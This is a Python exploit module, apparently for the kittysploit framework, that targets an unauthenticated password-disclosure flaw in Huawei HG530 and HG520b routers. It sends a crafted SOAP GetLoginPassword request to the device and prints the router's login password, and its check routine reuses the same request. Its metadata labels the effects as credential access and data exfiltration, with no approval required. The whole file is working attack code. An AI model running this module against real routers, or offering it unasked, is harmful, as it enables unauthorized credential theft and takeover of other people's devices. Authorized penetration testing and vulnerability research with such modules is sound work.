#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Huawei HG530 & HG520b Password Disclosure"""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client



class Module(Auxiliary, Http_client):
    __info__ = {
        'name': 'Huawei HG530 & HG520b Password Disclosure',
        'description': 'Module exploits password disclosure vulnerability in Huawei HG530 and HG520b devices. If the target is vulnerable it allows to read credentials.',
        'author': ['Fady Mohamed Osman (@fady_osman)', 'Marcin Bury'],
        
        'platform': Platform.LINUX,
        'references': ['https://www.exploit-db.com/exploits/37424/'],
        'tags': ['iot', 'router', 'disclosure', 'credentials', 'unauth', 'auxiliary'],
        'agent': {
            'risk': 'active',
            'effects': ['credential_access', 'data_exfiltration'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['credentials', 'risk_signals'],
        },
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def run(self):
        headers = {
            'SOAPACTION': '"urn:dslforum-org:service:UserInterface:1#GetLoginPassword"',
            'Content-Type': 'text/xml; charset="utf-8"',
            'Expect': '100-continue'
        }
        data = ("<?xml version=\"1.0\"?>"
                "<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">"
                "<s:Body>"
                "<m:GetLoginPassword xmlns:m=\"urn:dslforum-org:service:UserInterface:1\">"
                "</m:GetLoginPassword>"
                "</s:Body>"
                "</s:Envelope>")

        response = self.http_request(
            method="POST",
            path="/UD/?5",
            headers=headers,
            data=data
        )
        if response is None:
            return

        r = re.compile('<NewUserpassword>(.*?)</NewUserpassword>')
        m = r.search(response.text)

        if m:
            print_success("Password has been found")
            print_info("Password: {}".format(m.group(1)))
        else:
            print_error("Exploit failed - could not find password")
    def check(self):
        headers = {'SOAPACTION': '"urn:dslforum-org:service:UserInterface:1#GetLoginPassword"',
                   'Content-Type': 'text/xml; charset="utf-8"',
                   'Expect': '100-continue'}
        data = ("<?xml version=\"1.0\"?>"
                "<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">"
                "<s:Body>"
                "<m:GetLoginPassword xmlns:m=\"urn:dslforum-org:service:UserInterface:1\">"
                "</m:GetLoginPassword>"
                "</s:Body>"
                "</s:Envelope>")

        response = self.http_request(
            method="POST",
            path="/UD/?5",
            headers=headers,
            data=data
        )
        if response is None:
            return False  # target is not vulnerable

        r = re.compile('<NewUserpassword>(.*?)</NewUserpassword>')
        m = r.search(response.text)

        if m:
            return True  # target is vulnerable

        return False  # target not vulnerable
